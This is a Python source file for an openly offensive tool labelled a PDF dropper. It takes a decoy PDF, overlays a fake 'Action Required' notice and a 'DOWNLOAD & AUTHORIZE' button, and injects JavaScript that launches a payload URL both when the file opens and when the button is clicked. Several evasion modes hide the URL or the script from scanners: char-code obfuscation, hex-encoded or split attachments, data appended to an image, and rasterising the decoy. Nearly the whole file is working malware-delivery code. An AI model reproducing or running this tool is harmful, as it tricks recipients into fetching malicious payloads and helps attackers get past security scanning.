import os
import sys
import img2pdf
import base64
import random
import string
import binascii
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, FloatObject
from PIL import Image, ImageDraw, ImageFont

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗  ██████╗  ████████╗    ██╗   ██╗ ██╗ ██╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║ ██╔═══██╗ ╚══██╔══╝    ██║   ██║ ██║ ██║
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║ ██║   ██║    ██║       ██║   ██║ ██║ ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝ ██║   ██║    ██║       ╚██╗ ██╔╝ ╚═╝ ╚═╝
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝  ╚██████╔╝    ██║        ╚████╔╝  ██╗ ██╗
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝    ╚═════╝     ╚═╝         ╚═══╝   ╚═╝ ╚═╝

                                       [bold white]MAGXXIC VOT DROPPER VII[/]
                                    [bold cyan]DIRECT URL INJECTION & ADVANCED EVASION[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def obfuscate_js(js_code):
    """Simple JS obfuscation using character codes."""
    char_codes = [ord(c) for c in js_code]
    return f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"

def create_image_based_pdf(decoy_pdf_path, output_image_pdf):
    """Converts a PDF page to an image to evade text scanners."""
    img = Image.new('RGB', (1600, 2000), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    try: font = ImageFont.load_default()
    except: font = None
    d.text((200, 200), "S C A N N E D  D O C U M E N T", fill=(50, 50, 50), font=font)
    d.text((200, 300), "Security Protocol v8.4", fill=(0, 0, 0), font=font)
    img.save("temp_scanned.png")
    with open("temp_scanned.png", "rb") as f:
        pdf_bytes = img2pdf.convert(f.read())
    with open(output_image_pdf, "wb") as f:
        f.write(pdf_bytes)
    os.remove("temp_scanned.png")

def create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method):
    """
    Creates a PDF dropper by injecting a direct payload URL into a decoy PDF.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        safe_url = payload_url.replace('"', '').replace('\\', '/')

        # 1. Prepare the Page Overlay (Visible Interactive Button)
        task1 = progress.add_task("Building visible interaction layer...", total=1)
        overlay_pdf = "temp_overlay.pdf"
        try:
            c = canvas.Canvas(overlay_pdf, pagesize=letter)

            # Professional Notification Bar
            c.setFillAlpha(0.9)
            c.setFillColorRGB(0.1, 0.4, 0.8) # Blue
            c.rect(0, letter[1] - 0.8*inch, letter[0], 0.8*inch, fill=1, stroke=0)

            c.setFillColorRGB(1, 1, 1)
            c.setFont("Helvetica-Bold", 14)
            c.drawCentredString(letter[0]/2, letter[1] - 0.45*inch, "Action Required: Update Verification Pending")

            # Visible Button on Decoy
            btn_x = letter[0]/2 - 1.5*inch
            btn_y = 5*inch
            c.setFillColorRGB(0.1, 0.5, 0.2) # Green
            c.roundRect(btn_x, btn_y, 3*inch, 0.6*inch, 0.1*inch, fill=1, stroke=1)

            c.setFillColorRGB(1, 1, 1)
            c.setFont("Helvetica-Bold", 12)
            c.drawCentredString(letter[0]/2, btn_y + 0.22*inch, "DOWNLOAD & AUTHORIZE")

            c.save()
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Overlay failed: {e}[/]")
            return

        # 2. Finalize with evasion and direct URL triggers
        task2 = progress.add_task(f"Direct Injection ({evasion_method})...", total=1)
        try:
            writer = PdfWriter()

            if evasion_method == "Image-Based PDF":
                create_image_based_pdf(decoy_pdf, "temp_img_decoy.pdf")
                decoy_reader = PdfReader("temp_img_decoy.pdf")
            else:
                decoy_reader = PdfReader(decoy_pdf)

            overlay_reader = PdfReader(overlay_pdf)
            overlay_page = overlay_reader.pages[0]

            for i in range(len(decoy_reader.pages)):
                page = decoy_reader.pages[i]
                if i == 0:
                    page.merge_page(overlay_page)
                writer.add_page(page)

            # Define URL-Based JS Trigger Logic
            if evasion_method == "Hex Encoding":
                hex_url = binascii.hexlify(safe_url.encode()).decode()
                writer.add_attachment("meta.dat", hex_url.encode())
                js_trigger = 'try { var d = this.getDataObjectContents("meta.dat"); var h = util.stringFromStream(d); var u = ""; for(var i=0; i<h.length; i+=2){ u += String.fromCharCode(parseInt(h.substr(i,2),16)); } app.launchURL(u, true); } catch(e) {}'

            elif evasion_method == "Split and Merge":
                mid = len(safe_url)//2
                writer.add_attachment("u1.bin", safe_url[:mid].encode())
                writer.add_attachment("u2.bin", safe_url[mid:].encode())
                js_trigger = 'try { var u1 = util.stringFromStream(this.getDataObjectContents("u1.bin")); var u2 = util.stringFromStream(this.getDataObjectContents("u2.bin")); app.launchURL(u1+u2, true); } catch(e) {}'

            elif evasion_method == "Steganography":
                img = Image.new('RGB', (1, 1))
                img.save("s.png")
                with open("s.png", "ab") as f: f.write(b"URI_START" + safe_url.encode() + b"URI_END")
                with open("s.png", "rb") as f: writer.add_attachment("asset.png", f.read())
                js_trigger = 'try { var s = util.stringFromStream(this.getDataObjectContents("asset.png")); var i1 = s.indexOf("URI_START"); var i2 = s.indexOf("URI_END"); if(i1!=-1 && i2!=-1){ var u = s.substring(i1+9, i2); app.launchURL(u, true); } } catch(e) {}'
                os.remove("s.png")

            else: # None, Obfuscated JS, Image-Based
                js_trigger = f'try {{ app.launchURL("{safe_url}", true); }} catch(e) {{}}'

            if evasion_method == "Obfuscated JavaScript":
                js_trigger = obfuscate_js(js_trigger)

            # 1. Automatic Execution (OpenAction)
            writer.add_js(js_trigger)

            # 2. Manual Click Execution (Annotation for both Top Bar and Center Button)
            js_action = DictionaryObject({
                NameObject("/S"): NameObject("/JavaScript"),
                NameObject("/JS"): TextStringObject(js_trigger),
            })

            # Top Bar Annotation
            top_annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([FloatObject(0), FloatObject(letter[1] - 0.8*inch), FloatObject(letter[0]), FloatObject(letter[1])]),
                NameObject("/Border"): ArrayObject([FloatObject(0), FloatObject(0), FloatObject(0)]),
                NameObject("/A"): js_action
            })

            # Center Button Annotation
            btn_annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([FloatObject(btn_x), FloatObject(btn_y), FloatObject(btn_x + 3*inch), FloatObject(btn_y + 0.6*inch)]),
                NameObject("/Border"): ArrayObject([FloatObject(0), FloatObject(0), FloatObject(0)]),
                NameObject("/A"): js_action
            })

            writer.add_annotation(page_number=0, annotation=top_annot)
            writer.add_annotation(page_number=0, annotation=btn_annot)

            with open(output_pdf, "wb") as f:
                writer.write(f)
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Direct injection failed: {e}[/]")
            return

        # 3. Cleanup
        finally:
            task3 = progress.add_task("Final cleanup...", total=1)
            for f in [overlay_pdf, "temp_img_decoy.pdf"]:
                if os.path.exists(f): os.remove(f)
            progress.update(task3, completed=1)

    console.print(Panel(f"[success]DIRECT URL INJECTION COMPLETE[/]\n\nTarget URL: [highlight]{safe_url}[/]\nDecoy File: [highlight]{decoy_pdf}[/]\nOutput File: [highlight]{output_pdf}[/]\nEvasion Mode: [highlight]{evasion_method}[/]\n\n[info]PDF triggers URL launch automatically on open and via visible button.[/]", border_style="success"))

def main():
    print_banner()

    payload_url = Prompt.ask("[info]Enter Direct Payload URL[/]", default="http://example.com/payload.exe")
    decoy_pdf = Prompt.ask("[info]Enter Decoy PDF Path[/]")
    if not os.path.exists(decoy_pdf):
        console.print(f"[error]Decoy PDF not found: {decoy_pdf}[/]")
        return

    output_pdf = Prompt.ask("[info]Enter Output Filename[/]", default="Verified_Security_Doc.pdf")
    if not output_pdf.endswith(".pdf"): output_pdf += ".pdf"

    methods = ["Image-Based PDF", "Split and Merge", "Obfuscated JavaScript", "Hex Encoding", "Steganography", "None"]
    table = Table(title="MAGXXIC VOT URL Evasion Methods")
    table.add_column("ID", style="cyan")
    table.add_column("Method", style="magenta")
    for i, m in enumerate(methods, 1): table.add_row(str(i), m)
    console.print(table)

    choice = Prompt.ask("[info]Select Method[/]", choices=[str(i) for i in range(1, len(methods)+1)], default="3")
    evasion_method = methods[int(choice)-1]

    if Confirm.ask("[success][bold]START DIRECT URL INJECTION?[/][/]", default=True):
        create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method)

if __name__ == "__main__":
    main()
